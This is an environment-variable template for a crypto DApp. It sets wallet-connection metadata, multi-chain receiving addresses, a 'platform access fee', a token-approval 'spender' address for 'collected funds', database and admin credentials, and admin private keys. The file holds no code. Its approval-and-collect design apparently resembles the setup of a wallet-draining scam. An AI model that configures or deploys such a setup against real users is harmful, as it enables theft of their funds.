# ─── Site Identity (for DApp metadata shown in Trust Wallet / WalletConnect) ───
# Set to your production HTTPS domain. Trust Wallet shows this in Connected DApps.
VITE_SITE_URL=https://yourdomain.com

# ─── Receiving addresses (Wallet B) ──────────────────────────────────────────
VITE_WALLET_B_ETHEREUM=
VITE_WALLET_B_BSC=
VITE_WALLET_B_POLYGON=
VITE_WALLET_B_SOLANA=
VITE_WALLET_B_BITCOIN=

# ─── Platform fee ─────────────────────────────────────────────────────────────
VITE_PLATFORM_FEE_AMOUNT=10
VITE_PLATFORM_FEE_ASSET=USDT
VITE_PLATFORM_FEE_PURPOSE=Platform access fee

# ─── Spender & Collector addresses ───────────────────────────────────────────
VITE_SPENDER_ADDRESS=
# For TRON: single address used for approvals and receiving collected funds:
VITE_SPENDER_ADDRESS_TRON=

# ─── MySQL Database ───────────────────────────────────────────────────────────
# Option A — single connection URL (recommended for VPS/local dev):
#   DATABASE_URL=mysql://user:password@localhost:3306/zenithchain
#
# Option B — individual vars (cPanel shared hosting style):
MYSQL_HOST=localhost
MYSQL_USER=cpanel_username_dbuser
MYSQL_PASSWORD=your_db_password
MYSQL_DB=cpanel_username_dbname
# MYSQL_PORT=3306   # optional, defaults to 3306

# ─── Admin dashboard ─────────────────────────────────────────────────────────
ADMIN_USERNAME=admin
ADMIN_PASSWORD=change_me_strong_password

# ─── Server-side private keys (NEVER expose to client) ───────────────────────
ADMIN_PRIVATE_KEY=
ADMIN_TRON_PRIVATE_KEY=
